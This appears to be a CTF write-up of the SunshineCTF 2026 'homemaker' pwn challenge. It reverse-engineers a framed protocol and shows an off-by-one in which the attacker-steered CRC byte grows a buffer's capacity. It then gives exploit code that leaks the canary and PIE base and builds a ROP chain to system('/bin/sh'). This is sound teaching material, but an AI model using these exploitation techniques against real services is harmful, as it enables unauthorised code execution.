---
title: "Homemaker — Turning a CRC Into the Attacker's Byte"
date: 2026-10-21
tags: ["pwn", "rop", "off-by-one", "crc", "protocol"]
categories: ["SunshineCTF 2026"]
summary: "An integrity-check CRC byte becomes the source of an off-by-one. The defense flips straight into a write primitive that grows capacity."
translationKey: "homemaker"
---

## Overview

```
homemaker   amd64, PIE, Full RELRO, canary, NX, SHSTK, IBT, stripped
```

Connecting prints a banner.

```
MODEL 7 "HOMEMAKER" DOMESTIC AUTOMATON
SERVO-COMMAND LINK  ::  REV 3  ::  UNIT VB-04
>> INSERT SERVICE KEY CARD TO CONTINUE <<
```

A 1950s-retrofuture domestic robot programmed with punch cards, and that concept dictates the implementation directly.

| concept | implementation |
|---|---|
| one card = one command | fixed-format frames, not interactive text |
| service key card | opcode 1 auth, hardcoded key |
| the card inside the machine | a struct of `data` + `capacity` + `state` |
| cards can tear | CRC-8 integrity check |
| teletype era | ANSI escapes as frame delimiters |

Typing `help` does nothing. It takes no text commands, so whole frames have to be pushed in.

## 1. The protocol

### The frame

The receive function `FUN_001014cc` gives the format.

```
1b 5b | len(2 BE) | payload[len] | crc8 | 1b 5c
```

Opened by `ESC [` and closed by `ESC \`, with `payload[0]` as the opcode.

The layout of the receive buffer at `DAT_00104860` matters later.

```
+0          1b 5b
+2          len (2 BE)
+4          payload[0] .. payload[len-1]
+len+4      crc
+len+5      1b 5c
```

The length limit falls out of the parser's check.

```c
if ((uVar4 == 0) || (0x800 < (ulong)uVar4 + 7)) {
    *param_3 = 0xe2;
```

`len + 7 <= 0x800`, so `len` goes up to `0x7f9`.

### CRC-8

Polynomial `0x2f`, zero init, no reflection.

```python
def crc8(data):
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = ((crc << 1) ^ 0x2f) & 0xff if crc & 0x80 else (crc << 1) & 0xff
    return crc
```

The parser compares the received CRC against its own and rejects a mismatch with `0xe3`. All of this is ordinary transport machinery so far, unrelated to the attack.

### Status codes

The first response byte is a status. It says exactly which part of the reverse engineering is still wrong, so tabulating it early pays off.

```
0xe1 bad SOH    0xe2 bad length   0xe3 bad crc    0xe4 bad terminator
0xe5 auth failed    0xe6 not authenticated    0xe7 unknown opcode
```

## 2. The auth gate

Only opcode 1 gets through unauthenticated.

```c
if ((DAT_00104864 == '\x01') || (local_124 != 0)) {
```

`local_124` is the auth flag. It is **a stack local in the main loop, not a field of the card struct**, which turns out to be useful later.

The handler requires a length of exactly 5.

```c
if (param_3 == 5) {
    iVar2 = FUN_00101289((uint)*(byte *)(param_2 + 4) |
                         (uint)*(byte *)(param_2 + 1) << 0x18 |
                         (uint)*(byte *)(param_2 + 2) << 0x10 |
                         (uint)*(byte *)(param_2 + 3) << 8);
    if (iVar2 == 0) {
        *(undefined2 *)(param_1 + 0x100) = 0x100;
        *(undefined2 *)(param_1 + 0x102) = 1;
```

It assembles `payload[1..4]` big-endian and compares against `0x1337c35f`. The key is baked into the binary, so there is nothing to bypass.

```python
p.send(frame(b'\x01' + p32(0x1337c35f, endian='big')))
```

The gate does two jobs, though.

**It certifies the reverse engineering.** Getting through means the frame, the length and the CRC are all correct, so the protocol work is done.

**It arms the vulnerability.** `capacity` starts at zero and auth raises it to `0x100`. Before authenticating, no write clears the guard.

Those two lines are also the tell that `local_118` is a struct rather than an array. Writing at `+0x100` and `+0x102` of a 256-byte array means more fields follow.

## 3. The struct

```c
struct card {
    char     data[0x100];   // +0x000
    uint16_t capacity;      // +0x100
    uint16_t state;         // +0x102
    uint32_t pad;           // +0x104
    uint64_t canary;        // +0x108
    uint64_t saved_rbp;     // +0x110
    uint64_t retaddr;       // +0x118
};
```

Ghidra names it `local_118 [256]`, but the real address is `rbp-0x110`, because a `local_X` sits at `(rbp+8) - X`.

```
card+0x100  capacity   rbp-0x10
card+0x108  canary     rbp-0x08
card+0x110  saved rbp  rbp+0x00
card+0x118  retaddr    rbp+0x08
```

Taking the number in the variable name as an offset puts everything off by eight.

`state` is a counter that increments on every write.

```c
*(short *)(param_1 + 0x102) = *(short *)(param_1 + 0x102) + 1;
```

It has nothing to do with authentication; that lives in `local_124`, as above.

## 4. The off-by-one

The card write handler, `FUN_0010174c`.

```c
if (*(ushort *)(param_1 + 0x100) < (ushort)(param_3 - 1U)) {
    uVar2 = 0xffffffe2;
}
else {
    for (local_1c = 0; local_1c <= (ushort)(param_3 - 1U); local_1c = local_1c + 1) {
        *(undefined1 *)(param_1 + (int)(uint)local_1c) =
             *(undefined1 *)((ulong)local_1c + param_2 + 1);
    }
```

`param_3` is the frame length and `n = len - 1`. The guard is `capacity < n` and the loop is `i <= n`. So **it writes `len` bytes while checking `len - 1`.**

Sending `len = 0x101` gives `n = 0x100`.

```
guard   0x100 < 0x100   false → passes
loop    i = 0 .. 0x100  → 0x101 bytes written
```

`data[0x100]` is past the array. It is the low byte of `capacity`.

### Where the extra byte comes from

The source is `payload[1 + 0x100]` = `payload[0x101]`, but the payload is `0x101` bytes, indexed up to `0x100`. The receive buffer layout says what sits one slot further.

```
+4       payload[0] .. payload[0x100]
+0x105   crc            ← payload + 0x101
+0x106   1b 5c
```

**The overflowing byte is the frame's CRC.**

## 5. The CRC as a write primitive

The CRC is determined by the payload, and the payload is mine. So the CRC can be steered to any value.

```python
def tune_crc(payload, idx, target):
    buf = bytearray(payload)
    for b in range(256):
        buf[idx] = b
        if crc8(buf) == target:
            return bytes(buf)
    raise RuntimeError('no byte at %d yields crc %#04x' % (idx, target))
```

Most of the `0x100` bytes are meaningless filler. Pick one position as a free variable and try all 256 values; CRC-8's output space is 256 wide, so a solution usually exists.

```python
st = write_card(p, b'A' * 0x100, crc_target=0xff, tweak=0x80)
```

Only the low byte of `capacity` changes, so `0x0100` becomes `0x01ff`. `0x100` itself can't be reproduced, but `retaddr` sits at `0x118`, so that is plenty.

This is the turning point. A value that exists for integrity checking becomes a one-byte write the attacker chooses.

## 6. The leak

The read handler emits `capacity` bytes.

```c
FUN_001013a2(0, buf, *(uint16_t *)(buf + 0x100));
```

Taking `0x1ff` bytes gets all three at once.

```python
canary    = u64(dump[0x108:0x110])
saved_rbp = u64(dump[0x110:0x118])
retaddr   = u64(dump[0x118:0x120])
```

`retaddr` is the instruction after the call to `FUN_00101865`.

```
1a9a:  call   1865
1a9f:  mov    $0x0,%eax     ← return site
```

```python
elf.address = retaddr - 0x1a9f
assert canary & 0xff == 0, 'canary low byte should be 0'
assert elf.address & 0xfff == 0, 'pie base not page aligned'
```

Those two asserts validate the offset guesses immediately. A PIE base is page-aligned, and a glibc canary's low byte is zero.

## 7. Overwriting the return address

Everything up to `0x118` has to be rewritten, and that span holds things worth preserving.

```python
data = bytearray((b'B' * 8 + b'/bin/sh\x00').ljust(0x100, b'B'))
data += p16(0x1ff)
data += p16(1)
data += p32(0)
data += p64(canary)
data += p64(saved_rbp)
data += chain
data += b'C' * 8
```

Leaving out `capacity` means something like `ljust(0x108, b'B')` writes `0x4242` there, and that trips the response function's length guard.

```c
uVar4 = param_3 + 1;
if ((ulong)uVar4 + 7 < 0x801) {
```

`0x4242 + 8` exceeds `0x801`, so `write` never runs at all and the client sits waiting for a response. **The symptom is silence rather than a crash**, which makes this a particularly awkward mistake to track down.

`leave` pops `saved_rbp`, so the leaked value goes back there too.

### This write has its own off-by-one

The same bug fires again. `data` is `0x140` long, so one CRC byte lands at `card+0x140`. The chain runs from `0x118` to `0x137`, so it is clear of it. The trailing `b'C' * 8` widens that margin; without it the byte lands at `0x138`, still past the chain.

## 8. The /bin/sh address

`pop rdi` needs the address of the string.

The first attempt computed it from the stack, deriving the card address from the leaked `saved_rbp`.

```python
buf_addr = saved_rbp - 0x130
```

`saved_rbp` belongs to the caller's frame, so reaching the current one means tracking the effect of `push rbp` / `sub rsp` / `call`. Getting it wrong shows up like this.

```
sh: 1: \x02: not found
sh: 1: \xe0\xd2*}ov: not found
```

`system` ran; only the argument was wrong.

The response function makes the whole calculation unnecessary.

```c
if (param_3 != 0) {
    memcpy(&DAT_00104065, param_2, (ulong)param_3);
}
```

**The read command copies the card into BSS.** A BSS address is the PIE base plus a fixed offset, and the base is already known.

### The response overwrites that string

The final opcode 4 calls `FUN_001013a2(0, 0, 0)`. Even with no data, it still writes a CRC and a terminator.

```c
uVar4 = param_3 + 1;                       /* = 1 */
...
(&DAT_00104060)[(int)(uVar4 + 4)] = uVar3;  /* 0x4065 */
(&DAT_00104060)[(int)(uVar4 + 5)] = 0x1b;   /* 0x4066 */
(&DAT_00104060)[(int)(uVar4 + 6)] = 0x5c;   /* 0x4067 */
```

Which is exactly bytes 0 through 2 of the copied card. So the string moves eight bytes into the card, and the leading `b'B' * 8` absorbs those three.

```python
binsh = elf.address + 0x4065 + 8
```

`0x406d` is clear of the range the response touches.

## 9. Why system is there at all

The chain calls `system@plt` directly. That works without a libc leak because the program itself uses `system`.

```c
void FUN_001012d2(void)
{
  system("/bin/echo -n \'\'");
  ...
}
```

This is the opcode 5 handler. All it does is print an empty string, and **its only real effect is putting `system` in the import table.**

With Full RELRO the GOT is populated at load time, so opcode 5 never even has to be sent — and the exploit doesn't send it. That opcode exists in order to exist, not in order to be used.

## 10. The final chain

```python
chain = flat(
    elf.address + 0x12aa,
    binsh,
    elf.address + 0x101a,
    elf.address + 0x10c0,
)
```

The `ret` at `0x101a` is there for 16-byte stack alignment.

Opcode 4 is the trigger.

```c
case '\x04':
    FUN_001013a2(0,0,0);
    goto LAB_00101a69;
```

`LAB_00101a69` is where the canary is checked and the function returns normally.

```
canary check   passes, since it was restored
leave          rsp = rbp, pop rbp
ret            jumps to the chain at card+0x118
```

There is one more ordering requirement. After writing the chain, **opcode 3 has to be sent once.** Not to read anything, but to trigger the BSS copy that puts `/bin/sh` at `0x406d`.

```python
st = write_card(p, bytes(data))
read_card(p)
p.send(frame(b'\x04'))
```

## Notes

- The guard and the loop disagree by one character. `capacity < n` and `i <= n` each look fine alone; only together do they show that `len` bytes get written against a check on `len - 1`.
- The **source** of the overflowing byte is what has to be chased down. Knowing one byte overflows isn't usable on its own; it becomes a write primitive only once that byte turns out to be the CRC, which is attacker-controlled.
- A length field like `capacity` is consulted by both the read and the write path. Growing it once opens the leak and the overwrite together.
- A length-guard violation shows up as no response rather than a crash. `0x4242 + 8 > 0x801` merely skips the `write`, leaving the process healthy. When it hangs, check for a clobbered struct field first.
- An unused opcode creates the import. Whether `system` is in the binary comes down to `FUN_001012d2` alone, and that is what keeps the chain at four slots.
- checksec shows SHSTK and IBT enabled, but neither was enforced at runtime. Declaring them as ELF properties has no effect by itself.

---

Full scripts: [ctf-writeups/2026-sunshine/homemaker](https://github.com/wjddml/ctf-writeups/tree/main/2026-sunshine/homemaker)
